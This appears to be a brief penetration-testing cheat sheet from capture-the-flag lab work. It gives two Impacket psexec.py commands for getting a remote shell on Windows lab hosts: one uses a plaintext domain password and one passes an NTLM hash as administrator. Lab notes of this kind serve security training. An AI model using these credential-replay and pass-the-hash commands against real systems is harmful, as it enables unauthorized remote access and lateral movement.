__tags: windows windows psexec

#### Basic login

```
python psexec.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100'
```

#### Login if you have a Hash:

```
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82 administrator@10.10.10.82
```

